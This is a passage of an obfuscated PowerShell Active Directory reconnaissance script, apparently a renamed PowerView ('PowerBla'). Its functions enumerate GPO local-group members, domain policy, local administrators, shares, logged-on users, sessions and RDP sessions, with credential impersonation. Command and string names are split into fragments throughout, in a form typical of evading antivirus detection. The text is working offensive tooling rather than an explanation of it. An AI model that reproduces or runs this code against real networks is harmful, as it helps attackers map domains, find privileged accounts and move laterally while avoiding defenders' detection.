                if ($ComputerSite -and ($ComputerSite -notmatch ('Er'+'ror'))) {
                    $GPOGuids += &('Get-D'+'o'+'mainSite') @CommonArguments -Identity $ComputerSite -LDAPFilter ('(gpli'+'nk='+'*'+')') | &('ForEa'+'ch'+'-Objec'+'t') {
                        &('S'+'el'+'e'+'ct-String') -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &('F'+'orEac'+'h-'+'Obje'+'ct') {$_.Matches | &('S'+'elect'+'-O'+'bj'+'ect') -ExpandProperty Value }
                    }
                }

                $GPOGuids | &('Get-'+'D'+'om'+'a'+'inGPOLoca'+'lG'+'roup') @CommonArguments | &('S'+'o'+'rt-Objec'+'t') -Property GPOName -Unique | &('Fo'+'rEach-O'+'bje'+'c'+'t') {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | &('For'+'E'+'ach-Ob'+'ject') {
                        $Object = &('G'+'e'+'t-'+'DomainObject') @CommonArguments -Identity $_
                        $IsGroup = @(('2'+'684'+'35456'),('2'+'68435'+'457'),('5'+'3'+'6870912'),('5368'+'7'+'091'+'3')) -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = &('New-Obj'+'e'+'c'+'t') PSObject
                        $GPOComputerLocalGroupMember | &('A'+'d'+'d-Member') Noteproperty ('C'+'omput'+'erName') $Computer.dnshostname
                        $GPOComputerLocalGroupMember | &('Add-Me'+'m'+'ber') Noteproperty ('O'+'bjec'+'tName') $Object.samaccountname
                        $GPOComputerLocalGroupMember | &('A'+'dd-M'+'ember') Noteproperty ('Obj'+'ect'+'DN') $Object.distinguishedname
                        $GPOComputerLocalGroupMember | &('A'+'dd'+'-M'+'ember') Noteproperty ('Obje'+'ctSID') $_
                        $GPOComputerLocalGroupMember | &('Add'+'-'+'Me'+'mber') Noteproperty ('Is'+'Gr'+'oup') $IsGroup
                        $GPOComputerLocalGroupMember | &('Add-Memb'+'e'+'r') Noteproperty ('GPODisp'+'lay'+'Na'+'me') $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | &('A'+'dd-Me'+'mber') Noteproperty ('G'+'PO'+'Guid') $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | &('Add'+'-Membe'+'r') Noteproperty ('G'+'PO'+'Path') $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | &('Ad'+'d-Membe'+'r') Noteproperty ('GPOT'+'ype') $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add(('PowerBla.'+'GPOCompu'+'terL'+'o'+'cal'+'G'+'ro'+'upMem'+'b'+'er'))
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShoul'+'dPro'+'cess'), '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Sour'+'ce'), ('N'+'ame'))]
        [String]
        $Policy = ('Doma'+'in'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'m'+'ainCon'+'troller'))]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Ser'+'ver')]) { $SearcherArguments[('S'+'erver')] = $Server }
        if ($PSBoundParameters[('Serve'+'rTi'+'meLi'+'mit')]) { $SearcherArguments[('Ser'+'v'+'erT'+'i'+'meLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Crede'+'n'+'t'+'ial')]) { $SearcherArguments[('C'+'reden'+'t'+'ial')] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[('S'+'erver')]) { $ConvertArguments[('S'+'erver')] = $Server }
        if ($PSBoundParameters[('Cr'+'edent'+'ial')]) { $ConvertArguments[('C'+'re'+'d'+'ential')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('Do'+'main')]) {
            $SearcherArguments[('D'+'om'+'ain')] = $Domain
            $ConvertArguments[('Doma'+'in')] = $Domain
        }

        if ($Policy -eq ('A'+'ll')) {
            $SearcherArguments[('Ident'+'it'+'y')] = '*'
        }
        elseif ($Policy -eq ('Domai'+'n')) {
            $SearcherArguments[('I'+'denti'+'ty')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq ('Do'+'mainCo'+'nt'+'roller')) -or ($Policy -eq 'DC')) {
            $SearcherArguments[('Ide'+'nt'+'ity')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments[('Id'+'entity')] = $Policy
        }

        $GPOResults = &('Get'+'-Doma'+'inGPO') @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            $GptTmplPath = $GPO.gpcfilesyspath + (('Z'+'ncMACHINEZncM'+'icrosoftZncW'+'indows '+'NTZn'+'cSec'+'Ed'+'i'+'tZncGp'+'tTmpl.inf').rePlaCE(([ChaR]90+[ChaR]110+[ChaR]99),[striNG][ChaR]92))

            $ParseArgs =  @{
                ('Gpt'+'TmplP'+'ath') = $GptTmplPath
                ('OutputO'+'bje'+'ct') = $True
            }
            if ($PSBoundParameters[('Cre'+'dent'+'i'+'al')]) { $ParseArgs[('Cred'+'ent'+'ia'+'l')] = $Credential }

            &('Get-'+'Gp'+'t'+'Tmpl') @ParseArgs | &('F'+'o'+'r'+'Each'+'-Object') {
                $_ | &('Add-Me'+'mb'+'er') Noteproperty ('GP'+'ONa'+'me') $GPO.name
                $_ | &('A'+'dd-Me'+'m'+'ber') Noteproperty ('GP'+'ODispla'+'yN'+'a'+'me') $GPO.displayname
                $_
            }
        }
    }
}



function Get-NetLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SS'+'ho'+'ul'+'dProcess'), '')]
    [OutputType(('Powe'+'rB'+'la.'+'LocalGro'+'up.'+'A'+'PI'))]
    [OutputType(('Powe'+'rBla.'+'L'+'o'+'c'+'a'+'lGroup.WinNT'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('H'+'ostName'), ('dns'+'host'+'n'+'ame'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet(('AP'+'I'), ('WinN'+'T'))]
        [Alias(('Coll'+'ectionM'+'eth'+'o'+'d'))]
        [String]
        $Method = ('A'+'PI'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Creden'+'tia'+'l')]) {
            $LogonToken = &('Invo'+'ke-UserI'+'mpers'+'o'+'natio'+'n') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq ('A'+'PI')) {

                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                $Offset = $PtrInfo.ToInt64()

                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        $NewIntPtr = &('Ne'+'w-Obje'+'ct') System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = &('Ne'+'w'+'-Object') PSObject
                        $LocalGroup | &('A'+'dd-M'+'ember') Noteproperty ('Comp'+'uter'+'N'+'ame') $Computer
                        $LocalGroup | &('Add-Mem'+'b'+'er') Noteproperty ('G'+'roupNam'+'e') $Info.lgrpi1_name
                        $LocalGroup | &('Add-'+'M'+'ember') Noteproperty ('Comme'+'n'+'t') $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, ('PowerBla.'+'L'+'oc'+'a'+'lGroup.A'+'PI'))
                        $LocalGroup
                    }
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    &('Write-'+'Ve'+'rb'+'o'+'se') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | &('Where'+'-Obj'+'ect') { $_.psbase.schemaClassName -eq ('gro'+'up') } | &('ForEach-O'+'bje'+'ct') {
                    $LocalGroup = ([ADSI]$_)
                    $Group = &('New-Obje'+'c'+'t') PSObject
                    $Group | &('Add'+'-Memb'+'er') Noteproperty ('Computer'+'Na'+'me') $Computer
                    $Group | &('Ad'+'d-M'+'embe'+'r') Noteproperty ('Gr'+'o'+'upName') ($LocalGroup.InvokeGet(('Na'+'me')))
                    $Group | &('Add'+'-M'+'ember') Noteproperty ('SI'+'D') ((&('New-Obje'+'c'+'t') System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet(('obje'+'cts'+'id')),0)).Value)
                    $Group | &('Add-Mem'+'b'+'er') Noteproperty ('Co'+'mment') ($LocalGroup.InvokeGet(('D'+'escr'+'ipti'+'on')))
                    $Group.PSObject.TypeNames.Insert(0, ('PowerB'+'la.'+'Lo'+'calGr'+'o'+'up.W'+'inNT'))
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            &('In'+'v'+'o'+'ke-RevertTo'+'Self') -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'ShouldP'+'r'+'o'+'cess'), '')]
    [OutputType(('Pow'+'e'+'rBla.'+'LocalGroup'+'M'+'e'+'mbe'+'r.API'))]
    [OutputType(('PowerBl'+'a.LocalGroupMemb'+'er'+'.Wi'+'n'+'NT'))]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Host'+'Name'), ('d'+'n'+'shostname'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ('A'+'d'+'mi'+'nistrators'),

        [ValidateSet(('A'+'PI'), ('Wi'+'nNT'))]
        [Alias(('Collect'+'ionMetho'+'d'))]
        [String]
        $Method = ('A'+'PI'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('C'+'reden'+'tial')]) {
            $LogonToken = &('Invok'+'e-Use'+'rImp'+'er'+'sonation') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq ('AP'+'I')) {

                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        $NewIntPtr = &('Ne'+'w-Objec'+'t') System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            &('Wri'+'te'+'-Verb'+'ose') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            $Member = &('N'+'ew-Ob'+'ject') PSObject
                            $Member | &('Add-M'+'e'+'mber') Noteproperty ('Co'+'mput'+'e'+'rName') $Computer
                            $Member | &('A'+'dd-'+'Me'+'mber') Noteproperty ('Gr'+'oupNa'+'me') $GroupName
                            $Member | &('Add-Mem'+'b'+'er') Noteproperty ('Me'+'m'+'berName') $Info.lgrmi2_domainandname
                            $Member | &('Add-Memb'+'e'+'r') Noteproperty ('S'+'ID') $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq ('S'+'idTyp'+'eGrou'+'p'))
                            $Member | &('A'+'dd-'+'Member') Noteproperty ('IsG'+'roup') $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, ('PowerBla'+'.Lo'+'ca'+'lGroupM'+'ember.'+'API'))
                            $Members += $Member
                        }
                    }

                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    $MachineSid = $Members | &('Where-Obj'+'e'+'ct') {$_.SID -match ('.*-50'+'0') -or ($_.SID -match ('.*-5'+'01'))} | &('S'+'elect'+'-Objec'+'t') -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | &('F'+'orEac'+'h-'+'Objec'+'t') {
                            if ($_.SID -match $MachineSid) {
                                $_ | &('Add-'+'Me'+'mber') Noteproperty ('Is'+'Doma'+'in') $False
                            }
                            else {
                                $_ | &('A'+'dd'+'-Member') Noteproperty ('IsD'+'om'+'ain') $True
                            }
                        }
                    }
                    else {
                        $Members | &('F'+'orEac'+'h'+'-Objec'+'t') {
                            if ($_.SID -notmatch ('S-1-'+'5'+'-21')) {
                                $_ | &('Ad'+'d-'+'Member') Noteproperty ('I'+'sDomain') $False
                            }
                            else {
                                $_ | &('Ad'+'d-'+'Member') Noteproperty ('I'+'sDomain') ('UN'+'KN'+'OWN')
                            }
                        }
                    }
                    $Members
                }
                else {
                    &('Wr'+'it'+'e-Verb'+'ose') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke(('Member'+'s')) | &('Fo'+'rEach-O'+'bject') {

                        $Member = &('New-'+'Obj'+'ect') PSObject
                        $Member | &('Add-Mem'+'b'+'er') Noteproperty ('Compu'+'t'+'erName') $Computer
                        $Member | &('Add-'+'M'+'ember') Noteproperty ('Group'+'N'+'ame') $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet(('Ad'+'s'+'Path')).Replace(('W'+'inN'+'T://'), '')
                        $IsGroup = ($LocalUser.SchemaClassName -like ('gro'+'up'))

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | &('Add-Me'+'mb'+'er') Noteproperty ('Acc'+'o'+'untNa'+'me') $Name
                        $Member | &('Add-'+'M'+'ember') Noteproperty ('S'+'ID') ((&('New-'+'Obj'+'ec'+'t') System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet(('Obj'+'ect'+'SID')),0)).Value)
                        $Member | &('Add-'+'Mem'+'ber') Noteproperty ('IsGro'+'up') $IsGroup
                        $Member | &('Add-M'+'emb'+'er') Noteproperty ('I'+'sDo'+'main') $MemberIsDomain




                        $Member
                    }
                }
                catch {
                    &('Writ'+'e-Ver'+'bos'+'e') ('['+'Get-NetL'+'ocalG'+'roupMem'+'ber] '+'Erro'+'r '+'f'+'or '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            &('I'+'nvo'+'ke-RevertT'+'o'+'S'+'elf') -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {


    [OutputType(('Po'+'werBl'+'a.'+'Share'+'I'+'nfo'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'stNam'+'e'), ('dnsh'+'ost'+'name'), ('na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('loc'+'alhos'+'t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Crede'+'nti'+'al')]) {
            $LogonToken = &('Invo'+'ke-'+'Use'+'rImperson'+'at'+'io'+'n') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            $Offset = $PtrInfo.ToInt64()

            if (($Result -eq 0) -and ($Offset -gt 0)) {

                $Increment = $SHARE_INFO_1::GetSize()

                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = &('New-Ob'+'j'+'ect') System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    $Share = $Info | &('S'+'elect-O'+'bject') *
                    $Share | &('Ad'+'d-Me'+'mber') Noteproperty ('Com'+'p'+'uterName') $Computer
                    $Share.PSObject.TypeNames.Insert(0, ('Po'+'wer'+'B'+'la.Shar'+'eInfo'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                &('Write-'+'Ve'+'rb'+'ose') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if ($LogonToken) {
            &('I'+'nvoke-'+'RevertToSe'+'lf') -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {


    [OutputType(('Power'+'Bla'+'.Lo'+'g'+'gedOnUser'+'In'+'fo'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'st'+'Name'), ('dn'+'sho'+'stna'+'me'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('localhos'+'t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Creden'+'t'+'ial')]) {
            $LogonToken = &('In'+'voke'+'-Us'+'erIm'+'pe'+'rsonation') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            $Offset = $PtrInfo.ToInt64()

            if (($Result -eq 0) -and ($Offset -gt 0)) {

                $Increment = $WKSTA_USER_INFO_1::GetSize()

                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = &('New'+'-Ob'+'ject') System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    $LoggedOn = $Info | &('Se'+'lect-'+'Object') *
                    $LoggedOn | &('Add-Me'+'m'+'ber') Noteproperty ('Comput'+'erNa'+'m'+'e') $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, ('P'+'owe'+'rB'+'la.'+'Logge'+'d'+'O'+'nUserInfo'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                &('Wri'+'te-V'+'erbos'+'e') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if ($LogonToken) {
            &('In'+'voke'+'-Re'+'ver'+'tToSel'+'f') -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {


    [OutputType(('Po'+'w'+'e'+'rBla.S'+'essio'+'nInfo'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('H'+'o'+'stName'), ('dns'+'hostn'+'ame'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('l'+'ocal'+'host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Credent'+'i'+'al')]) {
            $LogonToken = &('Invoke-Use'+'rImpe'+'rsonat'+'io'+'n') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            $Offset = $PtrInfo.ToInt64()

            if (($Result -eq 0) -and ($Offset -gt 0)) {

                $Increment = $SESSION_INFO_10::GetSize()

                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = &('Ne'+'w'+'-Object') System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    $Session = $Info | &('Sel'+'ect-Ob'+'ject') *
                    $Session | &('Ad'+'d-'+'Mem'+'ber') Noteproperty ('Com'+'puter'+'Name') $Computer
                    $Session.PSObject.TypeNames.Insert(0, ('Po'+'werBla'+'.'+'SessionIn'+'f'+'o'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                &('Write-'+'Verbo'+'se') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if ($LogonToken) {
            &('Invoke-'+'Reve'+'rtToS'+'e'+'lf') -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShoul'+'dPro'+'cess'), '')]
    [OutputType(('Power'+'Bla.'+'Re'+'gLogge'+'dOn'+'Us'+'er'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Host'+'Nam'+'e'), ('d'+'nshos'+'tname'), ('na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('l'+'o'+'calhost')
    )

    BEGIN {
        if ($PSBoundParameters[('Cr'+'eden'+'tia'+'l')]) {
            $LogonToken = &('I'+'nvok'+'e-UserImp'+'erso'+'nation') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(('User'+'s'), "$ComputerName")

                $Reg.GetSubKeyNames() | &('Wher'+'e'+'-Object') { $_ -match ((('S-1-5-21-[0'+'-9]'+'+-[0'+'-9]+-['+'0-9]+-[0-'+'9]+'+'Q'+'Ci')-RepLaCe  ([cHar]81+[cHar]67+[cHar]105),[cHar]36)) } | &('ForEach-O'+'b'+'j'+'ect') {
                    $UserName = &('Con'+'ver'+'tFr'+'o'+'m-SID') -ObjectSID $_ -OutputType ('D'+'o'+'mainS'+'imple')

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = &('N'+'ew-Ob'+'ject') PSObject
                    $RegLoggedOnUser | &('Add-'+'M'+'ember') Noteproperty ('C'+'o'+'m'+'puterName') "$ComputerName"
                    $RegLoggedOnUser | &('Add-M'+'em'+'ber') Noteproperty ('Use'+'rDoma'+'in') $UserDomain
                    $RegLoggedOnUser | &('Add-'+'Mem'+'ber') Noteproperty ('User'+'Nam'+'e') $UserName
                    $RegLoggedOnUser | &('Add-Me'+'m'+'be'+'r') Noteproperty ('Us'+'er'+'SID') $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, ('Pow'+'e'+'r'+'B'+'la'+'.RegLogge'+'dOnUs'+'er'))
                    $RegLoggedOnUser
                }
            }
            catch {
                &('W'+'ri'+'t'+'e-Verb'+'ose') ('[Ge'+'t-RegL'+'oggedOn]'+' '+'E'+'r'+'ror '+'op'+'en'+'ing '+'r'+'emote'+' '+'re'+'gis'+'try '+'on'+' '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if ($LogonToken) {
            &('Invoke-RevertT'+'o'+'Se'+'l'+'f') -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {


    [OutputType(('Powe'+'rB'+'la'+'.RD'+'PSession'+'Inf'+'o'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('H'+'ost'+'Name'), ('dnsh'+'o'+'stnam'+'e'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('lo'+'calh'+'ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Cr'+'e'+'dentia'+'l')]) {
            $LogonToken = &('Invoke-U'+'serImper'+'son'+'at'+'ion') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            if ($Handle -ne 0) {

                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    for ($i = 0; ($i -lt $pCount); $i++) {

                        $NewIntPtr = &('New-Ob'+'j'+'ect') System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = &('Ne'+'w-'+'Object') PSObject

                        if ($Info.pHostName) {
                            $RDPSession | &('Ad'+'d-M'+'e'+'mber') Noteproperty ('Computer'+'N'+'am'+'e') $Info.pHostName
                        }
                        else {
                            $RDPSession | &('A'+'dd-Membe'+'r') Noteproperty ('Com'+'puterNa'+'m'+'e') $Computer
                        }

                        $RDPSession | &('Add-M'+'emb'+'er') Noteproperty ('Sess'+'io'+'nNa'+'me') $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $RDPSession | &('Ad'+'d-Mem'+'ber') Noteproperty ('UserN'+'ame') "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | &('Add'+'-Mem'+'ber') Noteproperty ('UserN'+'am'+'e') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | &('Ad'+'d-Me'+'mber') Noteproperty 'ID' $Info.SessionID
                        $RDPSession | &('A'+'dd'+'-Member') Noteproperty ('S'+'tate') $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            &('Write'+'-Ver'+'bo'+'se') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = &('New-Ob'+'j'+'ect') System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | &('Add-Memb'+'e'+'r') Noteproperty ('SourceI'+'P') $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, ('Power'+'Bl'+'a.RDPSe'+'ssi'+'onI'+'nfo'))
